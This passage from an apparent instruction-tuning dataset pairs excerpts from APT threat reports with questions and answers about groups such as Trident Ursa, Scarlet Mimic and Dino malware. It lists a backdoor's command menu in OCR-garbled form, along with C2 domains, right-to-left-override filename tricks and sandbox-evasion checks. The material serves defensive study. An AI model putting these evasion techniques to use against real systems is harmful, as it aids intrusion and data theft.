    "output": "The specific vulnerability exploited by the attackers in the Roaming Tiger APT report was CVE-2014-1761. The first stage shellcode failed to locate the second stage shellcode because it could not find the 'p!11' marker. This marker is significant as it acts as an identifier or delimiter that the first stage shellcode uses to locate and execute the second stage shellcode. The failure to find this marker indicates a flaw in the implementation of the exploit, leading to the inability of the first stage shellcode to proceed with its intended actions.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Targeting Beyond Ukraine\nTraditionally, Trident Ursa has primarily targeted Ukrainian entities with Ukrainian language lures. While this is still the most common scenario for this group, we saw a few instances of them using English language lures. We assess that these samples indicate that Trident Ursa is attempting to boost their intelligence collection and network access against Ukrainian and NATO allies.\nIn line with these efforts to target allied governments, during a review of their IoCs we identified an unsuccessful attempt to compromise a large petroleum refining company within a NATO member nation on Aug. 30.\nBig Headline: Beyond Just Hacking: Open Threats to Cybersecurity Community\nOne of our most surprising observations was when an individual named Anton (in Cyrillic, \u0410\u043d\u0442\u043e\u043d) who appeared to be tied to Trident Ursa threatened a small group of cybersecurity researchers on Twitter, on the same day Russia invaded Ukraine (Feb. 24, 2022). It appears that Anton chose these researchers based on their tweets highlighting Trident Ursa's IoCs in the days prior to the invasion.\nThe first tweets (shown in Figure 1) came from Anton (@Anton15001398) as the invasion was underway, to Ukraine-based threat researcher Mikhail Kasimov (@500mk500). In several tweets, he said, \"run, i'm coming for you.\" Likely figuring his first tweets to Kasimov were too unnoticeable, his last tweet included the #Gamaredon hashtag so it would be more publicly discoverable by other researchers.\nLater that same day, Anton used a different account (@YumHSh2UdIkz64w) to send Shadow Chaser Group (@ShadowChasing1) and TI Research (@tiresearch1) the ominous message \"let's be friends. We do not want to fight, but we do it well!\" as shown in Figure 2.\nTwo days later, on Feb. 26, Anton sent his last and most threatening tweet yet (Figure 3). In it, he provides Mikhail Kasimov's full name, date of birth and address along with the message, \"We are already in the city, there is nowhere to run. You had a chance.\"\nWe imagine these direct, threatening communications from this purported Trident Ursa associate were unsettling to the recipients (especially Mikhail Kasimov, a researcher operating from within the war zone). To their credit, the targeted researchers were undaunted, and tweeted additional Trident Ursa IoCs over the weeks following these threats. Kasimov, along with a large number of other researchers from around the world, continues to routinely publish new IoCs for this APT.\nBig Headline: DNS Shenanigans\nTrident Ursa has used  as a way to increase the resilience of their operations, and to make analysis of their infrastructure more difficult for cybersecurity analysts. Infrastructure using fast flux DNS rotates through many IPs daily, using each one for a short time to make IP-based block listing, takedown efforts and forensic analysis difficult.\nThe use of this technique is the primary reason Unit 42 researchers focus on Trident Ursa's domains instead of their IPs. Since June 2022, we've seen Trident Ursa use several other techniques in addition to fast flux to enhance their operational efficacy.\nA number of legitimate tools and services have been used by this threat actor in their operations. Threat actors often abuse, take advantage of or subvert legitimate products for malicious purposes. This does not necessarily imply a flaw or malicious quality to the legitimate product being abused.\nMedium Headline: Bypassing DNS Through Legitimate Web Services\nThe first example of additional techniques we've observed uses legitimate services to query IP assignments for malicious domains. By using these services, Trident Ursa is effectively bypassing DNS and DNS logging for the malicious domains. For example, the sample SHA256 499b56f3809508fc3f06f0d342a330bcced94c040e84843784998f1112c78422 calls the legitimate service ip-api[.]com to get the IP associated with josephine71.alabarda[.]ru through the following URL: hxxp://ipapi[.]com/csv/josephine71.alabarda.ru.\nAs of the time of writing this post, this process returns the following:\nThe malware uses the IP returned through this communication for follow-on communications with the malicious domain. The only DNS query that would show up in logging would be the original request for ip-api[.]com.\nMedium Headline: Bypassing DNS Through a Messaging Service\nIn the second example, Trident Ursa uses Telegram Messenger content to look up the latest IP used for command and control (C2). In this way, the actor is attempting to supplement DNS for when targets successfully block malicious domains.\nFor example, the sample SHA256 3e72981a45dc4bdaa178a3013710873ad90634729ffdd4b2c79c9a3a00f76f43 calls to hxxps://t[.]me/s/dracarc. As of Nov. 18, this account (@dracarc) returned the Telegram post ==104@248@36@191==. This is converted to the IP 104.248.36[.]191 and it is used for follow-on communications.\nMedium Headline: Hiding True IP Assignment Through Separate IPs for Root Domain and Subdomains\nOn Nov. 15, we noticed that the Trident Ursa domain niobiumo[.]ru was assigned to the U.S. Department of Defense Network Information Center IP 147.159.180[.]73. We quickly identified that Trident Ursa had no operational control over, or use of, that IP.\nTrident Ursa had seeded the fast flux DNS tables for its root domains with \"junk\" IPs in an attempt to confuse researchers and protect its true operational infrastructure. Instead of using root domains, they were instead using subdomains for their operations.\nThe true operational IP could only be found by querying DNS upon a subdomain. In this case (shown in Figure 4), querying upon subdomain aaa.niobiumo[.]ru returned the operational IP 64.227.67[.]175.\nWe highlight two observations stemming from our analysis of Trident Ursa's DNS activity:\nFor its operational infrastructure outside of Russia, Trident Ursa has relied primarily on VPS providers located within one of two autonomous systems (AS), AS14061 (DigitalOcean, LLC) and AS20473 (The Constant Company, LLC). Over the past six weeks, of the 122 IP addresses we identified outside of Russia, 63% of them were within AS14061 and 29% were within AS20473. The remainder were located across several AS owned by UAB Cherry Servers.\nOver 96% of Trident Ursa's domains continue to be registered and under the DNS of the Russian company reg[.]ru, a company that \u2013 to date \u2013 has taken no action to block or deny this malicious infrastructure.\nQuestion: How did Trident Ursa attempt to obfuscate their true operational infrastructure, and what were the key observations from analyzing their DNS activity?",
    "output": "Answer: Trident Ursa attempted to obfuscate their true operational infrastructure by seeding the fast flux DNS tables for their root domains with 'junk' IPs, such as assigning the domain niobiumo[.]ru to the U.S. Department of Defense Network Information Center IP 147.159.180[.]73, which they had no control over. Instead, they used subdomains for their operations, with the true operational IP only being found by querying DNS upon a subdomain, such as aaa.niobiumo[.]ru returning the operational IP 64.227.67[.]175. Key observations from analyzing their DNS activity include that for operational infrastructure outside of Russia, Trident Ursa relied primarily on VPS providers within two autonomous systems (AS), AS14061 (DigitalOcean, LLC) and AS20473 (The Constant Company, LLC). Additionally, over 96% of Trident Ursa's domains continue to be registered and under the DNS of the Russian company reg[.]ru, which has taken no action to block or deny this malicious infrastructure.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Small Headline: 4.2.2 Social Engineering Sophistication Base Value\nWhile the content analysis results clearly show attacks tailored to the interests of targeted groups, content coding alone does not give a relative score of the sophistication used in the attacks. We now describe how we assign the \"social engineering sophistication base value\" to emails based on their level of social engineering.\nTo measure the targeting sophistication we assign a score that ranges from 0-5 that rates the social engineering techniques used to get the victim to open the attachment. This score considers the content and presentation of the e-mail message as well as the claimed sender identity. This determination also includes the content of any associated files, as malware is often implanted into legitimate relevant documents to evade suspicion from users when the malicious documents are opened.\nThe Social Engineering Sophistication Base Value is assigned based on the following criteria:\n0 Not Targeted: Recipient does not appear to be a spe-cific target. Content is not relevant to the recipient. The e-mail is likely spam or a non-targeted phishing attempt.\n1 Targeted Not Customized: Recipient is a specific target. Content is not relevant to the recipient or contains information that is obviously false with little to no validation required by the recipient. The e-mail header and/or signature do not reference a real person or organization.\n2 Targeted Poorly Customized: Recipient is a specific target. Content is generally relevant to the target but has attributes that make it appear questionable (e.g. incomplete text, poor spelling and grammar, incorrect addressing). The e-mail header and / or signature may reference a real person or organization.\n3 Targeted Customized: Recipient is a specific target. Content is relevant to the target and may repurpose legitimate information (such as a news article, press release, conference or event website) and can be externally ver-ified (e.g. message references information that can be found on a website). Or, the e-mail text appears to re-purpose legitimate e-mail messages that may have been collected from public mailing lists or from compromised accounts. The e-mail header and / or signature references a real person or organization.\n4 Targeted Personalized: Recipient is a specific target. The e-mail message is personalized for the recipient or target organization (e.g. specifically addressed or referring to individual and / or organization by name). Content is relevant to the target and may repurpose legitimate information that can be externally verified or appears to repurpose legitimate messages. The e-mail header and / or signature references a real person or organization.\n5 Targeted Highly Personalized: Recipient is a spe-cific target. The e-mail message is individually personalized and customized for the recipient and references confidential / sensitive information that is directly relevant to the target (e.g. internal meeting minutes, compromised communications from the organization). The e-mail header and / or signature references a real person or organization.\nContent coding of emails and determinations of social engineering ratings for the TTI were performed by five independent coders who were given a code book for content categories and the TTI social engineering scale with examples to guide analysis. We performed regular inter-rater reliability checks and flagged any potential edge cases and inconsistencies for discussion and reevaluation. Following completion of this analysis, two of the authors reviewed the social engineering base value scores to ensure consistency and conformity to the scale. We provide specific examples of each of these targeting values in Appendix A.\nSmall Headline: 4.2.3 Summary of Social Engineering Sophistication Base Value\nFigure 3 shows the targeting score for organizations in our study who submitted at least 50 e-mails. We can see that actors targeting these groups put significant effort into targeting their messages, in particular the three Tibetan groups included in Figure 3 observe more than half of their messages with a targeting score of 3 or higher. This result means adversaries are taking care to make the e-mail appear to come from a legitimate individual or organization, and include relevant information (e.g., news reports or exchanges from public mailing lists). Higher targeting scores, which result from actions such as personalizing lures to an individual in the group, or including information that requires prior reconnaissance tend to be more rare, but we do observe instances of them. For example, in the case of China Group 3, we observed an e-mail which received a social engineering score of 5, which claimed to be from the group's funder and referenced a specific meeting they had planned that was not public knowledge.\nSmall Headline: 4.3.1 Assessment methodology\nThe first step in our analysis pipeline is determining whether the email contains politically motivated malware or not. This process involves an initial inspection for social engineering of the email message and attachment (e.g., an executable pretending to be a document). We also correlate with other emails received as part of this project to identify already-known malware. Well-known\nmalware attacks (e.g., the Zeus trojan masquerading as an email from the ACH credit card payment processor, or Bredolab malware pretending to be from the DHL courier service) are not considered targeted attacks in our study, but are still kept for potential review.\nOnce we have identified emails which we suspect of containing politically-motivated malware, we perform the following analysis steps on any attachments to verify that they indeed contain malware. First, we run the attachment in a sandboxed VM to look for malicious activity e.g., an Office document writing files to disk or trying to connect to a C&C server. We also check the MD5 hash of the attachment against the Virus Total database to see if it matches existing viruses. We also manually examine the attached file for signs of malicious intent (e.g., executable payload in a PDF, shellcode or Javascript). We exclude any graphics attached to the email which are used for social engineering (and do not contain malicious payload) from our analysis.\nWe follow this initial analysis with more detailed technical analysis of the attachments which we confirm contain malware. First, we manually verify the file type of the attachment for overview statistics. This manual analysis is necessary as the Unix file command may be misled by methods of manipulating important bytes in the file (e.g., replacing \\rtf1 with \\rtf[null]). We then identify if the vulnerability included in the malware already exists in a corpus of vulnerabilities, such as the Common Vulnerabilities and Exposures (CVE) naming system. We also perform analysis of network traffic from the attachment to identify the C&C server the malware attempts to contact. In cases where the malware does not execute in our controlled environment we manually examine the file to extract the relevant information.\nOn a case-by-case basis we use additional tools such as IDA [1] and OllyDbg [3] for detailed static and dynamic analysis, respectively. Our goal in this analysis is to identify relationships between malware campaigns between organizations, or instances of the same malware family repeatedly targeting a given organization. By observing overlapping C&C servers, or mapping malware to common exploits identified by anti virus/security companies we can cluster attacks that we believe come from the same malware family and potentially the same adversary.\nAnswer this question: What insights does the study provide regarding the level of effort put into social engineering by actors targeting civil society organizations, particularly Tibetan groups?",
    "output": "The study provides insights into the significant effort put into social engineering by actors targeting civil society organizations, particularly Tibetan groups. The results show that more than half of the messages received by the three Tibetan groups in the study had a targeting score of 3 or higher. This indicates that adversaries are taking considerable care to make the emails appear legitimate by including relevant information and making them seem to come from real individuals or organizations. Higher targeting scores, which involve personalizing lures to individuals or including information requiring prior reconnaissance, are rarer but do occur, demonstrating the sophisticated nature of these attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Small Headline: Backdoor Payload: BKDR_ YAHAMAM\nBKDR_YAHAMAM is usually encrypted then embedded in an image file. When decrypted, it is loaded and executed in memory by a .DLL file that is registered as a service (TROJ_YAHAMAM). It exfiltrates data from infected systems, downloads and uploads files, and has a remote shell. It also drops a rootkit component named \"usb.sys,\" detected as RTKT_HIDEPORT.ZTCA-XO. The rootkit creates the service, usb30, and hides evidence of port communication to evade detection and remain persistent.\nSmall Headline: Command-and-Control Communication\nWhen executed, BKDR_YAHAMAM checks if it runs under svchost.exe. It uses the configuration file, %windows %\\Fonts\\mfc41.tff, which contains the following information:\n\u2022 C&C1\n\u2022 C&C2\n\u2022 C&C3\n\u2022 ControlPort\n\u2022 DownloadURL1\n\u2022 DownloadURL2\n\u2022 DownloadURL3\n\u2022 LoginPass (for authentication purposes)\n\u2022 Port1\n\u2022 Port2\n\u2022 Port3\n\u2022 USB\n\u2022 UserMark\nBKDR_YAHAMAM encrypts C&C communication using multiplication with a 1-byte key. Attackers can use the \"?\" and \"Help\" commands to see the various options the backdoor offers as shown in its code.\nTool used to emulate command-and-control (C&C) communication with a 64-bit version of BKDR_ YAHAMAM\nWe were able to download some files from two of the C&C servers that TROJ_YAHAMAM accesses. These had some image files that the 32- and 64-bit versions of the backdoor can choose from for use in attacks.\nVery Small Headline: Operation Tropic Trooper\nor Help\nCleanEvent GetUser\nDelUser [UserNameJ\n- -> Help Menu\n--> Clean Log --> List Accounts --> Delete Account\nEnumService\nViewservice l ServiceName I DelService [ServiceName]\n--> 6 List Services\n--> View Specific Service --> Delete Service\nPut [RecvIPJ [Port] [FileNameJ GetFile [IP] [Port] [FileName]\nGet [http://IP/A.exe] [File.exe] DownLoad (Remote File] UpLoad [LocalFileJ\nDecryptFile [SrcFile] (DstFile]\nRun [Program] [Parameterl\nArun [Program] (Parameter] CmdRun [CmdProgram] [Parameter]\nFt [ModifyFile] [ReferFile]\nDt [ModifyDir] [ReferDir]\nLex [CtrlIP] [CtrlPortl IDestIP] [DestPortf\nStopLcx\n- -> Send File To FileClient\n--> Get File From FileServer --> Get File From IIS\n--> DownLoad File From Remote\n--> UpLoad File From Local Decrypt File\n--> Execute As System\n--> Execute As LogonUser --> Execute Cmd Program\n--> Change File's TJ..Ine\n--> Change Dir's Time\n--> Stop Lex E\"unc\nSys.Info Getinfo\nSoftinfo\nOneKey OneKeyDisk\nPslist\nPskill [PID] Modlist [PIDf\nNetstat\nListIP Ipconfig\nTcpKill [LocalHost] [Port] IRemoteHost] [Port]\n--> 1 View System Infor 2 View Machine Infor\n3 View Installed Software\n--;,, Collect All Info --> Get All Disk Fileinfo\n--> 7 List Process\n--> Kill Process --> List Process Module\n--> 5 View TCP\n--> 6 List IP Info --> Show IPconfig\n--> Clear A TCP Connection\nShell [cmd.exe]\nShellA\nWinlogon [Domain] [User] [Pass]\nWhoAmI [PID] ShellTo [IP]\n[Port] New [IPJ [Port]\nPshell [IP] [Portf\nNcmd [IP] [Port]\nViewTermPort\nSetTermPort LPortJ InstallTerm rPortl\nStopTerm\nConfigView Set [Option]\nKingView (KingConfigFilel\nKingSet [KingConfigFile] [Option!\nStartUSB StopUSB\nScreenCapture\nCD\nDir [Parameter] [Is I Ldir\nDirxe Dirxb\nCopy [Sour] [Dest] [/s]\nDel [File !Dir) I\nMd (DirName] Rd (DirName]\nType [File Name]\nVer Reboot\nExit Sleep [Min]\nSleepTo [Date] ResetConnect\n--> 4 Get A Shell 44 Shell to Work Dir\n--> Get\nShell As\nLogonUser\n--> Get User Shell With Pass\n--> Display Self Work Info\n- -> Send Shell To Client --> Send New To Client\n--> Send PowerShell to NcmdClient\n--> Send Shell to NcmdClient\n--> View Terminal Port\n--> Set Terminal Port\n--> Install Terminal Service\nStop Terminal\nService\n--> 9 View Self Config\n- -> Set Config --> View King's Config\n--> Set King's Config\nStart USB Fune\n--> Stop USB E\"unc\n--> 11 Get DesktopScreen\n- -> Change Dir Display Info\n--> Display Local Files\n--> Dir Work D.ir\n--> Dir Bmp Dir\n--> Copy Sour to Dest --> Delete Files or Dir\n--> Made a Dir\n--> Delete a\nDir --> Display File's Content\n- -> Show Version --> Reboot\nSystem Exit Control\n--> --> 0 Sleep 1440,\nEntry Sleep --> SleepTo Date, eg. 20140506\n--> 12 Reset Fail Counts to Zero\nRemember To Run Pstore!!\nList Help Completed\nThe following table lists the unique SHA-1 hashes that TROJ_YAHAMAM downloads, along with their backdoor payloads.\nC&C servers TROJ_YAHAMAM accesses to download malicious payloads\nInterestingly, a BKDR_POISON variant was found on the sites' folders as well, leading us to believe that the attackers also use it for Operation Tropic Trooper.\nBKDR_YAHAMAM can steal practically any type of file saved on infected systems. Apart from stealing data, it can also perform more harmful actions like kill processes and services, delete files and directories, and put systems to sleep, among others.\nBKDR_YAHAMAM also attempts to install an accompanying executable rootkit (%windows %\\system32\\ drivers\\usb30.sys, detected as RTKT_HIDEPORT.ZTCA-XO). RTKT_HIDEPORT.ZTCA-XO is also XOR encrypted and found at byte key, \"0x90,\" to hide the port that the backdoor should use according to the configuration file. It will only hide communication activities occurring in the first of three port entries indicated in the configuration file. After creating and starting the rootkit service, BKDR_YAHAMAM then attempts to delete the rootkit and the related service. This will not stop the rootkit from running in the background.\nBKDR_YAHAMAM variants with rootkits for 32-bit systems run on 32-bit versions of Windows XP. On Windows 7 64-bit systems, however, the backdoor works but the rootkit does not.\n\nQuestion: How does BKDR_YAHAMAM handle command-and-control (C&C) communication, and what measures are taken to secure this communication in Operation Tropic Trooper?\n\nAnswer:",
    "output": "BKDR_YAHAMAM handles C&C communication by checking if it runs under svchost.exe and using a configuration file located at %windows%\\Fonts\\mfc41.tff. This file contains various C&C server details, ports, and URLs. The communication is encrypted using multiplication with a 1-byte key to secure the data exchange between the backdoor and the C&C servers. This encryption helps protect the communication from being easily intercepted and understood by security analysts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 3.3.1 Malware Connections: Enfal\nOne of our objectives in this report was to explore the broader ecosystem of malware. While analysis of individual attacks may yield interesting data, a broader understanding of connections between malware networks allows us to better understand the methods, targets and capabilities of the attackers. Based on the malware tools and  command and control infrastructure collected as part of the Shadows in the Cloud investigation we were able to draw connections between the Shadow network and at least two other, possibly affiliated, malware networks.\nWhen grouping malware networks together we interpret relationships between the command and control infrastructures, characteristics of the malware, attack vectors and exploits used, and any identifying information left behind by the attackers. This allows us to track the activities of similar yet distinct groups of attackers over time. More importantly, this historical perspective allows us to apply a granular level of analysis when investigating attacks, rather than simply grouping attackers and malware together by the country of origin. When grouping malware we focus on:\n\u2462 IP address relationships - the historical relationship between command and control domains that resolve to same IP addresses over time.\n\u2462 Malware connection relationships - malware found on one command and control server that connects to a different command and control server.\n\u2462 Malware file path relationships - the presence of distinctive file paths on multiple command and control servers.\nThere are limitations to this approach. For example, multiple attackers could operate on a common infrastructure, perhaps supplied by a group that specialises in malicious hosting or selling registered domain names to be used as command and control servers. Different groups of attackers could use the same, or very similar, malware. However, when the malware is not publicly available or for sale, its use remains limited. During the Shadow investigation we found the Enfal trojan among the instances of malware used by the attackers. The Enfal trojan is not widely available and appears to be in use by affiliated malware networks that sometimes share a common command and control infrastructure.\nIn fact, domain names that have been used as Enfal command and control servers by separate, but possibly affiliated, attackers \u2014 assam2008.net, msnxy.net, sysroots.net, womanld.com, womannana.com, lookbyturns. com, macfeeresponse.com and macfeeresponse.org \u2014 have now been incorporated into our sinkhole project. This allows us to observe compromised computers that are still checking in with the command and control servers as well as the file paths being requested. In some cases, we can obtain the names of documents located on the compromised computers. These domain names are associated with Enfal and can also be linked to the active command and control servers in the Shadow network through common command and control server IP addresses.\nAnother group of attackers that also used the Enfal trojan were documented in 2008 by Maarten Van Horenbeeck. He published information concerning his investigation into the targeted malware attacks which included the use of the Enfal Trojan dating back to 2007. Van Horenbeeck systematically documented a series of targeted attacks and clearly articulated the methodology of the attackers, one of which is now commonplace. The attackers leverage social engineering tactics to entice the target into clicking on a malicious link or email attachment. The malware then exploits a vulnerability in the user's client side software, such as a browser, Microsoft Word, Adobe Reader and so on, and begins communicating with a command and control server. Enfal is recognisable due to the consistent filenames the malware requests from the command and control server, most notably \"/cgi-bin/owpq4.cgi\". Van Horenbeeck identified domain names used by Enfal, *.bluewinnt. com and *.ggsddup.com, which are still in use today (Van Horenbeeck 2008a; Van Horenbeeck 2008b; Van Horenbeeck 2007).\nWhile we were unable to find any instances of common command and control infrastructure between the Enfal network that Van Horenbeeck documented, the methods and tools of these attackers and the Shadow network are very similar. The common use of the Enfal Trojan suggests that the attackers may be exchanging tools and techniques. The profile of the victims from two separate Enfal-based networks in our DNS sinkhole suggest that the attackers have an interest in compromising similar sets of targets. Finally, the failed DNS resolution for www.assam2008.net found on a computer at the OHHDL also compromised by the Shadow network indicates a possibly closer connection, or that they at least have both common tools and target sets.\n\nAnswer this question based on the above context: What specific characteristics of the Enfal trojan indicate its limited availability and potential affiliation with other malware networks? How does the sinkhole project aid in monitoring compromised computers associated with Enfal?",
    "output": "The Enfal trojan is not widely available and appears to be in use by affiliated malware networks that sometimes share a common command and control infrastructure. Specific domain names used as Enfal command and control servers, such as assam2008.net, msnxy.net, sysroots.net, womanld.com, womannana.com, lookbyturns.com, macfeeresponse.com, and macfeeresponse.org, have been incorporated into the sinkhole project. This allows researchers to observe compromised computers that are still checking in with the command and control servers, as well as the file paths being requested. In some cases, the names of documents located on the compromised computers can also be obtained.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Introduction\nThe sample of Dino documented in this blog post was used in 2013 against targets in Iran. The original means of infection is unknown, though we believe Dino was installed by another program, as it contains an uninstallation command without the corresponding installation procedure. Given the set of commands it can receive, Dino's main goal seems to be the exfiltration of files from its targets.\nThe binary's original name, \"Dino.exe\", has been left visible by its authors, as was the case with Casper. Dino \u2013 which could be referring to the pet character from cartoon show \u2013 was already mentioned in a recent as a \"full\u00adfeatured espionage platform,\" but no technical analysis has been published yet.\nRoughly, Dino can be described as an elaborate backdoor built in a modular fashion. Among its technical innovations, there is a custom file system to execute commands in a stealthy fashion, and a complex task\u00adscheduling module working in a similar way to the \"cron\" Unix command. Interestingly, the binary contains a lot of verbose error messages, allowing us to see Dino's developers' choice of wording. Also, a few technical artefacts suggest that Dino was authored by native French speakers.\n\nQuestion: Why might the authors of the Dino malware have chosen to leave the binary's original name 'Dino.exe' visible, and what does this tell us about their strategy? Additionally, how does the modular design of Dino contribute to its effectiveness as a backdoor?\n\nAnswer:",
    "output": "The authors of the Dino malware chose to leave the binary's original name 'Dino.exe' visible, much like they did with Casper. This could indicate a level of confidence or indifference towards being detected, possibly because they believed their targets were unlikely to notice or understand the significance of the filename. This strategy might also suggest that the malware was designed to operate in environments where detection mechanisms were assumed to be weak or non-existent. The modular design of Dino contributes to its effectiveness as a backdoor by allowing different functionalities to be added or removed as needed. This modularity makes the malware more flexible and adaptable to various target environments and objectives. For instance, Dino includes a custom file system to execute commands stealthily and a complex task-scheduling module similar to the 'cron' Unix command, which enhances its ability to perform tasks without being easily noticed.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Attack Details\nThe majority of attacks we associate with Scarlet Mimic follow the pattern shown in Figure 1.\nThe attacker sends a spear\u00adphishing e\u00admail with a subject and body content that appeal to the targeted user. This e\u00admail carries an attachment, which is typically a document that exploits a Microsoft Office vulnerability. The attachment uses a file name that is related to the e\u00admail content to trick the user into opening it. If the user opens the file and the exploitation is successful, a backdoor Trojan is installed on the system that gives the attacker access and a decoy document is displayed to\nthe victim. Decoy documents are typically non\u00admalicious versions of the content the user expected to see when opening the attachment.\nMany of the targets and spoofed or compromised sending e\u00admail addresses have contact information on the Internet. The apparent sender email usually appears to be someone associated with the accompanying text, when appropriate, while the target emails are usually also available online tied to target organizations. A small subset of the decoys could not be found online and may be from previous compromises by Scarlet Mimic.\nMany attackers deploy this particular pattern, as it is often successful at infecting a user without alerting the user of the infection. This is the exact same pattern, for example, deployed by the attackers in .\nWe have identified spear phishing documents from Scarlet Mimic exploiting the following vulnerabilities.\nCVE\u00ad2012\u00ad0158\nCVE\u00ad2010\u00ad3333\nCVE\u00ad2010\u00ad2883\nCVE\u00ad2010\u00ad2572\nCVE\u00ad2009\u00ad3129\nWe also know Scarlet Mimic uses a number of toolkits to create documents that contain exploit code to install the FakeM payload on a compromised system. Unit 42 tracks the toolkits delivering FakeM under the names , WingD and Tran Duy Linh. These kits appear to be used by many attack groups, and they alone are not a good indication of Scarlet Mimic activity.\nAdditionally, in many cases these threat actors did not use an exploit document at all, rather they sent self\u00adextracting (SFX) RAR archives that use the Right\u00adto\u00adLeft Override character to mask the true file extension. For example, the following two filenames of SFX archives used to deliver FakeM contain the RLO character (bolded):\nMedium Headline: Update about the status of Tenzin Delek Rinpoche'ashes%E2%80%AEcod.scr tepsiliy mezmun.\\xe2\\x80\\xaetxt.scr\nEven when no software vulnerability is exploited, the attacks still typically include a decoy document. The content of most of the decoy documents appear to be available on the open Internet, and the attackers typically made small modifications to them.\nMany of the targets and spoofed or compromised sending accounts have contact information on the Internet. The apparent sender email usually appears to be someone associated with the accompanying text, when appropriate, while the target emails are usually also available online tied to target organizations. A small subset of the decoys could not be found online and may be from previous compromises by Scarlet Mimic. The overarching decoy themes were Uyghur\u00adrelated, anti\u00adPutin, or Al\u00adQaeda\u00adrelated. The decoys are often copied from think tanks or reputable news sources\nthe targets would likely frequent.\nIn one instance, the threat actors used content from a (Figure 2) on the same day it was published.\nFigure 3 shows one of the more common themes used to target Uyghurs and those interested in their cause. Multiple attacks used press releases or other content related to the World Uyghur Congress.\nIn July of 2015, we identified a full e\u00admail uploaded to an antivirus scanning service that carried a Scarlet Mimic exploit document. In this case (Figure 4) the recipient of the e\u00admail was an individual working for the Russian Federal Security Service (fsb.ru). The e\u00admail body requests help dealing with threatening phone calls from an international gang.\nAnother attack, sent to an unknown target carried a decoy image (Figure 5) that compared Russian President Vladimir Putin to Adolf Hitler.\nIn yet another case, the threat actors used a conference notification from one organization (Figure 6a) and modified it to appear as thought it was for an \"Islamic Country Muslim Religion Conference\"\n(Figure 6b). This document was particularly poorly altered, as the registration form still contained multiple hints to indicate the document was fraudulent (Figure 6c).\nIn total we have collected over 40 individual decoy documents used in these attacks, far more than we can detail here.\nWe are aware of one case where Scarlet Mimic broke from the spear\u00adphishing pattern described above. In 2013, the group deployed a watering hole attack, also known as a strategic web compromise to infect victims with their backdoor. The watering hole is an attack vector that involves compromising a website that targeted victims are likely to visit in order to infect and gain access to their systems. According to a blog by , threat actors compromised the Tibetan Alliance of Chicago's website to host malicious code that exploited a vulnerability in Internet Explorer (CVE\u00ad2012\u00ad4969.) Microsoft patched this vulnerability in September 2012, suggesting that this watering hole attack used an older vulnerability, which aligns with the threat groups continued use of older vulnerabilities in their spear\u00adphishing efforts.\n\nWhat specific vulnerabilities and toolkits does Scarlet Mimic exploit in their spear-phishing documents, and how do they sometimes bypass the need for exploiting software vulnerabilities?",
    "output": "Scarlet Mimic exploits several vulnerabilities in their spear-phishing documents, including CVE-2012-0158, CVE-2010-3333, CVE-2010-2883, CVE-2010-2572, and CVE-2009-3129. They use toolkits such as WingD and Tran Duy Linh to create documents containing exploit code to install the FakeM payload. In some cases, they do not use exploit documents at all; instead, they send self-extracting (SFX) RAR archives that use the Right-to-Left Override character to mask the true file extension, ensuring the delivery of the FakeM payload without relying on software vulnerabilities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Dino Belongs To The Farm\nThe amount of shared code between Dino and known Animal Farm malware leaves very little doubt that Dino belongs to Animal Farm's arsenal. Among these shared features, we can cite the following:\nAt the very beginning of Dino execution, the current process name is checked against process names used by some sandboxes:\nA very similar check (against \"klavme\", \"myapp\", \"TESTAPP\" and \"afyjevmv.exe\") is present in Bunny samples, and in some first\u00adstage implants deployed by Animal Farm.\nTo hide its calls to certain API functions, Dino employs a classic Animal Farm ploy: a hash is calculated from the function's name and used to look for the address of the API function. The actual hashing algorithm used\nin Dino is the same that was used in , namely a combination of rotate\u00adleft (ROL) of 7 bits and exclusive\u00ador (XOR) operations.\nThe Dino's custom file system \u2013 the so\u00adcalled ramFS \u2013 is present in several droppers used by Animal Farm. In those binaries the file system serves to set the persistence of the payload. For example, here is the command executed by some NBOT droppers in the context of ramFS:\nAs a final indication that Dino belongs to Animal Farm menagerie, it is noticeable that the output of Dino's sysinfo command looks like an updated version of the \"beacon\" from the SNOWBALL implant described in the leaked CSE slides \u2013 part of operation SNOWGLOBE, which led to the discovery of Babar:\nDino's sysinfo example output\nLogin/Domain (owner): Administrator/JOHN (john)\nComputer name: JOHN\nOrganization (country): (United States)\nRecId: 11173\u00ad01\u00adPRS\nMaxDelay: 3600\nVersion: 1.2\nOS version (SP): 5.1 (Service Pack 3)\nWOW64: No\nDefault browser: firefox.exe\nIE version: Mozilla/4.0 (compatible; MSIE 7.0; Win32)\nFirst launch: 04/01/2015 \u2013 18:31:14\nTime to kill: N/A\nLast launch : 04/01/2015 \u2013 19:21:44\nMode: N/A | Rights: Admin | UAC: No\nID: 4635BEF0\u00adD89D\u00ad11E4\u00adB283\u00ad000C\u00ad29FD2872\nInstallAv: 0\nInj: Yes\nMedium Headline: French speaking Developers\nDino adds at least two more indicators to those already documented suggesting that Animal Farm developers are French speaking:\nDino's binary contains a resource whose language code value is 1036. The original purpose of this language code is to allow developers to provide resources (menus, icons, version information\u2026) for different locations in the world in the corresponding language. Interestingly, when a developer does not manually specify the language code, the compiler sets it to the language of the developer's machine. So, which language corresponds to the value 1036, or 0x40c in hexadecimal? .\nOf course a non\u00adFrench speaking developer could have deliberately set this value to mislead attribution efforts. But in more recent Animal Farm binaries (for example Casper), this language code has been set to the classical English (USA) language code. Therefore, it seems that Animal Farm developers forgot to set this value in their first creations, realized their mistake at some point, and decided to set a standard value. Someone using the language code as a false flag would have likely kept the strategy going.\nFor the record, this Dino sample is not the only Animal Farm binary with 1036 as language code.\nDino's binary is statically linked with the , which is used to manipulate big numbers in cryptography algorithms. The GnuMP code in Dino contains file paths coming from the developer's machine:\n..\\..\\src\\arithmetique\\mpn\\mul.c\n..\\..\\src\\arithmetique\\printf\\doprnt.c\n..\\..\\src\\arithmetique\\mpn\\tdiv_qr.c\n..\\..\\src\\arithmetique\\mpn\\mul_fft.c\n..\\..\\src\\arithmetique\\mpn\\get_str.c\nAs the attentive reader has probably guessed, \"arithmetique\" is the French translation of \"arithmetic\".\nBig Headline: 